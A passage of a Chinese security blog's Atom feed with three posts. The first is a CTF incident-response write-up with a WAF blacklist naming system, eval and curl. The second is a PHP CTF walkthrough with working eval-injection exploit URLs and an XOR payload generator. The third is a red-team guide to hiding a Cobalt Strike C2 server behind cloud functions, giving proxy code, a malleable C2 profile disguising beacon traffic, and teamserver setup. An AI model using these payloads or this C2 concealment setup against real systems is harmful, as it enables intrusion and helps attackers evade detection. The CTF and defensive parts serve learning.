    <summary type="html">&lt;p&gt;PKU的一道简单flask web题 感觉挺有意思的&lt;br&gt;代码如下&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>广东省强网杯运维赛部分WP</title>
    <link href="https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
    <id>https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/</id>
    <published>2021-11-15T12:45:56.000Z</published>
    <updated>2021-11-15T13:41:41.374Z</updated>
    
    <content type="html"><![CDATA[<p>上周末打了强网杯，某赛道打了第三名拿了二等奖，上午是运维赛，下午是awd。<br>上午的运维赛出的还可以，我觉得难度相对低一点，一共12道题，到最后基本有一半的人能做出来6-8道左右，本赛道第三-八名全部是8道题。这次拿奖得亏了有pwn👴去修题，我web应急响应做的不如别人多。</p><p>吐槽：下午的AWD纯脑瘫，参赛手册写的是AWDP，赛制介绍则是AWD。不一致也就算了，下午AWD只给一道巨难的pwn是什么意思？最后放hint连exp都快放完了，最后只有高校组有1-2支队伍在打，其他赛道全在罚坐。</p><h1 id="web运维"><a href="#web运维" class="headerlink" title="web运维"></a>web运维</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>有一个存在反序列化漏洞的页面，大体意思就是传入参数之后反序列化进行命令执行，题目本身给了waf，只不过关键词比较少。如 blacklist=’\php|flag|system|&#39;;自己加一些关键字就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\:\/\/|file\:\/\/|fread|create\_function|php|script|\&lt;\?php|\&#x27;|\&quot;|\(|\)|\&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$back_list</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$query</span>))  <span class="comment">// 假设用户输入的参数是 $query</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hack detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多加了几个关键字这题的check就过了</p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p> ls -all 看了一下有.2.php，我直接 rm -rf 删完之后这个check点还是没有过，之后又ll看了下发现是不死马。<br> 杀不死马有2种思路，第一种是写脚本无限循环删除，python或者shell或者php脚本都可以，第二种是重启php-fpm服务。这次给的权限比较高，是root，可以直接重启。但是在大部分awd比赛中可能没有重启服务的权限，所以第一种思路是必行的。<br> 附脚本<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rm -rf .3.php;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;remove success&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><br>上传上去之后chmod u+x 1.sh 然后 nohup ./1.sh &amp;挂着跑就可以了。</p><h2 id="phpinfo信息泄露"><a href="#phpinfo信息泄露" class="headerlink" title="phpinfo信息泄露"></a>phpinfo信息泄露</h2><p>没啥好说的，删了就行。</p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>把源码搞下来放到D盾查杀，查到了后门，直接删掉就好，还有XXE，文件也是直接删掉就好。</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><p>web就那么几道题我是妹想到的，我以为后面还会放题，专门问了主办方，主办方说一次放完，好吧，那估计是要在其他地方找patch点了。top看了一下，有一个进程的cpu利用率过高，在/home/ctf/mxxx目录下（具体目录名称记不清了）是一个elf文件，同目录下还有json的配置文件，直觉告诉我是挖矿。挖矿程序常在tmp目录写点东西，这里的操作就是首先干掉挖矿进程，然后删掉挖矿程序以及tmp目录下对应的内容，然后查看crontab防止再次下载与自启动。</p><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontab这题我应该是妹做出来，异常点是ctf用户的crontab，我是root用户。看了 /var/spool/cron/crontabs没看到啥东西,就没在看。赛后师傅说了下 crontab -user -l 也可以看指定用户的crontab。。学到了</p><h2 id="外连socket"><a href="#外连socket" class="headerlink" title="外连socket"></a>外连socket</h2><p>netstat -antlp 之后发现有向9999端口外连的行为，然后ps aux 和ps ef 之后看到了命令类似 sh -c python3 -c “__import__(‘os’).system(‘xxxxxx’)”。可以确定是这些进程建立了socket连接，但是找不到具体是谁起了这些进程…就很无奈，杀也杀不掉，这里我的处理方法是把python3的软连接给干掉了。因为通过观察进程发现除了这些外连的没有用py3起的进程。这里其实是有个so文件被修改了，后面pwn的队友修复的。</p><h2 id="ssh公钥"><a href="#ssh公钥" class="headerlink" title="ssh公钥"></a>ssh公钥</h2><p>ssh 免密登录存放的公钥在~/.ssh/authorized_keys文件里面，由于我们是私钥登录，但是里面有三个公钥，我们只保留了我们私钥对应的公钥，其他公钥全给删了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次运维赛相对基础，就当温习一下应急响应了。毕竟只正经做过一次：）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上周末打了强网杯，某赛道打了第三名拿了二等奖，上午是运维赛，下午是awd。&lt;br&gt;上午的运维赛出的还可以，我觉得难度相对低一点，一共12道题，到最后基本有一半的人能做出来6-8道左右，本赛道第三-八名全部是8道题。这次拿奖得亏了有pwn👴去修题，我web应急响应做的不如别</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>两道简单ctf-php-web题</title>
    <link href="https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/"/>
    <id>https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/</id>
    <published>2021-11-05T16:26:30.000Z</published>
    <updated>2021-11-05T16:32:23.106Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$attrid</span>) &amp;&amp; is_array(<span class="variable">$attrvalue</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrids</span> = count(<span class="variable">$attrid</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$attrids</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$attrstr</span> .= <span class="string">&#x27;&quot;&#x27;</span>.intval(<span class="variable">$attrid</span>[<span class="variable">$i</span>]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$attrvalue</span>[<span class="variable">$i</span>].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span> &lt; <span class="variable">$attrids</span>-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$attrstr</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String2Array(<span class="variable">$attrstr</span>);</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意点：extract可以进行变量覆盖，<span class="keyword">eval</span>那句话是把字符串数组格式转为真正的数组。</span><br><span class="line">exp:</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=2%22);system(%27whoami%27);//&amp;attrid%5B0%5D=1">http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1</a><br><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=1&amp;attrid%5B0%5D=2&amp;attrstr=phpinfo()">http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo()</a>;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(&#39;0&#39;);</span><br><span class="line">$str1 &#x3D; $_GET[&#39;str1&#39;];</span><br><span class="line">$str2 &#x3D; $_GET[&#39;str2&#39;];</span><br><span class="line">function waf($str)</span><br><span class="line">&#123;</span><br><span class="line">$blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;;</span><br><span class="line">    if (preg_match($blacklist,$str))</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return  true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function HackMe($str1,$str2)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; &quot;&quot;;</span><br><span class="line">for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$array1[$i] &#x3D; $str1[$i];</span><br><span class="line">&#125;</span><br><span class="line">for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)</span><br><span class="line">&#123;</span><br><span class="line">$array2[$b] &#x3D; $str2[$b];</span><br><span class="line">&#125;</span><br><span class="line">for ($c&#x3D;0;$c &lt;count($array1);$c++)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; $str.($array1[$c] ^ $array2[$c]);</span><br><span class="line">&#125;</span><br><span class="line">if (strlen($str)&lt;&#x3D;30)</span><br><span class="line">&#123;</span><br><span class="line">if (waf($str))</span><br><span class="line">&#123;</span><br><span class="line">echo $str;</span><br><span class="line">eval($str);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;nonono you are sooooooooo lang~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HackMe($str1,$str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目复现时没有waf.php，在比赛的时候需要去fuzz下过滤了哪个字符，所以我这里简单写了些waf的实现，直接写到function里面了。简单的异或，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ava_alpha=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">32</span>&lt;i <span class="keyword">and</span> i&lt;<span class="number">127</span>):</span><br><span class="line">        ava_alpha.append(<span class="built_in">chr</span>(i))</span><br><span class="line">target_str=<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">res1=<span class="string">&quot;&quot;</span></span><br><span class="line">res2=<span class="string">&quot;&quot;</span></span><br><span class="line">blacklist=[<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Getoutofloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(target_str)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ava_alpha:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ava_alpha:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))==(target_str[k]) <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> blacklist <span class="keyword">and</span> j <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                    res1+=<span class="built_in">str</span>(i)</span><br><span class="line">                    res2+=<span class="built_in">str</span>(j)</span><br><span class="line">                    <span class="keyword">raise</span> Getoutofloop()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较简单的异或，写脚本的时候注意如何跳出所有循环，这里用到了raise exception，可以根据黑名单维护blacklist保证不用blacklist里面的字符生成异或字符。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike 云函数隐藏服务器IP</title>
    <link href="https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/"/>
    <id>https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/</id>
    <published>2021-10-15T09:46:15.000Z</published>
    <updated>2021-10-15T11:14:32.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q">https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q</a></p><p><a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在红队基础设施建设中，使用云函数可隐藏真实C2的IP地址，当然，这只是其中一种方法，其他方法包括但不限于特征消除、证书修改、CDN、域前置。这些技术会陆续实现。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>腾讯云注册云函数</p><p>新建函数-自定义创建函数</p><p><img src="http://cdn.polowong.top/image-20211015185512996.png" alt="image-20211015185512996"></p><p>Python模板，python3.6即可，触发方式选择API网关触发</p><p>在函数代码中写入如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    C2=<span class="string">&#x27;http://&#x27;</span> <span class="comment"># C2 IP地址，这里可以使用 HTTP、HTTPS~下角标~</span></span><br><span class="line">    path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.headers)</span><br><span class="line">        <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>接下来配置API网关</p><p><img src="http://cdn.polowong.top/image-20211015185830062.png" alt="image-20211015185830062"></p><p>版本选择LATEST，点进去蓝色的链接进行API配置，路径改为根目录</p><p><img src="http://cdn.polowong.top/image-20211015185912831.png" alt="image-20211015185912831"></p><p><img src="http://cdn.polowong.top/image-20211015185921658.png" alt="image-20211015185921658"></p><p>然后下一步，事件函数，版本选择LATEST，一定要勾选响应集成。之后点立即完成就可以了。</p><p>发布服务之后在右边可以看到API的HTTP与HTTPS地址，记住这个有用，当然了，在云函数那也可以看（函数服务-触发管理-访问路径）</p><p><img src="http://cdn.polowong.top/image-20211015190133119.png" alt="image-20211015190133119"></p><h1 id="cobalt-strike配置"><a href="#cobalt-strike配置" class="headerlink" title="cobalt strike配置"></a>cobalt strike配置</h1><p>CS的配置踩大坑。</p><p>首先是编写对应的profile，代码如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">set</span> <span class="string">sample_name</span> <span class="string">&quot;t&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">sleeptime</span> <span class="string">&quot;3000&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">jitter</span>   <span class="string">&quot;0&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">maxdns</span>   <span class="string">&quot;255&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">useragent</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line"><span class="string">http-get</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/x&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">metadata</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;SESSIONID=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-stager</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x86</span> <span class="string">&quot;/vue.min.js&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x64</span> <span class="string">&quot;/bootstrap-2.min.js&quot;</span><span class="string">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-post</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/y&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">id</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;JSESSION=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写完之后命名为c2.profile，然后用cs目录下的c2lint.sh进行检查，这个东西的作用就是检查编写的profile是否正确。</p><p>c2lint.sh ./c2.profile</p><p><img src="http://cdn.polowong.top/image-20211015190808713.png" alt="image-20211015190808713"></p><p>这样看是没啥问题，然后运行teamserver的时候后面跟上profile就可以了，例如</p><p>./teamserver.sh 1.1.1.1 123456 c2.profile</p><p>这样就可以把profile作为listener的配置。</p><p>启动cs后，添加http listener，HOSTS和STAGER填写如下</p><p><img src="http://cdn.polowong.top/image-20211015191005476.png" alt="image-20211015191005476"></p><p>都是生成的云函数的地址，注意把前面的HTTP：//去掉！！</p><p>保存后，生成EXE，上线。</p><p>然后在victim主机上查看流量，并没有发现C2的IP地址,140开头的地址不是我的地址。</p><p><img src="http://cdn.polowong.top/image-20211015191107942.png" alt="image-20211015191107942"></p><p><img src="http://cdn.polowong.top/image-20211015191253179.png" alt="image-20211015191253179"></p><p>这样就使用云函数实现了C2真实IP的隐藏，在CS中也可以正常使用命令，证明beacon工作无异常。</p><p><img src="http://cdn.polowong.top/image-20211015191425103.png" alt="image-20211015191425103"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q&quot;&gt;ht</summary>
      
    
    
    
    
